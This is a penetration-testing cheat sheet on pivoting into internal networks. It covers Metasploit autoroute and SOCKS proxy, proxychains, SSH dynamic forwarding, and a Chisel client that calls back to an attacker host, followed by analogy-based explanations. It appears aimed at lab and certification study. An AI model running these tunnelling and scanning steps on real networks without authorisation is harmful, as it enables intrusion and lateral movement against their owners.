## 🛡️ The Pivoting Cheat Sheet (Master Resume)

### Case 1: Strictly Metasploit (In-House Routing) — Heavy Hitter ⭐⭐⭐

**Best for:** Using MSF scanners and exploits against the internal network. No external tools. **The Flow:** `Your Command → Metasploit Engine → autoroute table → Session ID → Target`

1. **Land a Session:** Get your Meterpreter shell (e.g., Session 1).
    
2. **Set the Route:** `meterpreter > run autoroute -s 10.10.10.0/24` _(This links the subnet to your current Session ID)._
    
3. **Verify:** `meterpreter > run autoroute -p`
    
4. **Background:** `meterpreter > background`
    
5. **Use MSF Module:** `msf6 > use auxiliary/scanner/portscan/tcp`
    
6. **Target Internal IP:** `msf6 > set RHOSTS 10.10.10.5`
    
7. **Run:** `msf6 > run`

---

### Case 2: Metasploit + Kali Tools (Proxychains) — Heavy Hitter ⭐⭐⭐

**Best for:** Running Nmap, CrackMapExec, or Impacket from your Kali terminal through MSF. **The Flow:** `Kali Tool (proxychains) → /etc/proxychains4.conf → SOCKS Proxy (9050) → MSF → Session ID → Target`

1. **Prerequisite:** Follow Case 1 (Session must be active + `autoroute` set).
    
2. **Start SOCKS Server:** `msf6 > use auxiliary/server/socks_proxy` `msf6 > set SRVPORT 9050` `msf6 > run -j` _(This creates the "mouth" of the tunnel on your Kali)._
    
3. **Configure Kali:** `echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf`
    
4. **Attack:** `proxychains nmap -sT -Pn 10.10.10.5`

---

### Case 3: SSH Dynamic Forwarding (No MSF)

**Best for:** Linux pivots where you have **Credentials**. Very stealthy "Living off the Land." **The Flow:** `Kali Tool (proxychains) → SSH Tunnel → Pivot Interface → Target`

1. **Create the Bridge:** `ssh -D 9050 [USER]@[PIVOT_IP]` _(Requires pivot user password/key)._
    
2. **Configure Proxychains:** Ensure `/etc/proxychains4.conf` points to `127.0.0.1 9050`.
    
3. **Attack:** `proxychains crackmapexec smb 10.10.10.0/24`

---

### Case 4: Chisel (No MSF - Windows/Linux) — Heavy Hitter ⭐⭐⭐

**Best for:** Windows pivots or bypassing firewalls. No creds/session IDs needed once agent is running. **The Flow:** `Kali Tool (proxychains) → Chisel Server (1080) → Chisel Client (Pivot) → Target`

1. **On Kali (Server):** `./chisel server -p 8000 --reverse`
    
2. **On Pivot (Client):** `./chisel client [KALI_IP]:8000 R:socks`
    
3. **Configure Proxychains:** Use port **1080** (Chisel default for SOCKS).
    
4. **Attack:** `proxychains nmap -sT -Pn 10.10.10.5`

---
---
### 1. Why `autoroute`? (The Internal Map)

**Metasploit** is the private club. It has a secret back door (your Meterpreter session) that leads to the target's internal network.

- **The Problem:** By default, Metasploit has no idea that Session #1 can reach the `10.10.10.0/24` network.
    
- **The Fix:** When you run `autoroute`, you are giving Metasploit a **map**. You are saying: _"Hey MSF, if you ever receive traffic for 10.10.10.x, don't send it to the internet—send it through <u>this Session</u>."_
    
- **Result:** Metasploit now knows how to handle the traffic **once it’s inside** Metasploit.

---

### 2. Why the MSF SOCKS Proxy? (The Front Door)

**Nmap** and **CrackMapExec** are "outsiders." They are separate programs running on your Kali Linux, and they aren't allowed inside the "Metasploit Club" by default.

- **The Problem:** Nmap cannot "see" your Meterpreter session. It doesn't speak "Metasploit."
    
- **The Fix:** You start the `socks_proxy` module in MSF. This opens a **Front Door** on your Kali machine (Port 9050).
    
- **Result:** This door acts as a translator. Anything Nmap throws into port 9050 gets "translated" and pushed into the Metasploit Club.

---

### 3. Why `/etc/proxychains4.conf`? (The Taxi Driver)

Now you have the **Map** (Autoroute) and the **Front Door** (SOCKS Proxy). But **Nmap** is a stubborn program—if you just run `nmap`, it will try to go straight out to your local Wi-Fi/Ethernet.

- **The Problem:** Nmap doesn't know you opened a secret door on port 9050.
    
- **The Fix:** You edit the Proxychains config to say: _"The secret door is at 127.0.0.1:9050."_ Then, when you run `proxychains nmap`, Proxychains acts like a **Taxi Driver**. It grabs Nmap's hand and forces it to walk through the door on port 9050.
    
- **Result:** Nmap is now forced to enter the Metasploit Club.

---
---
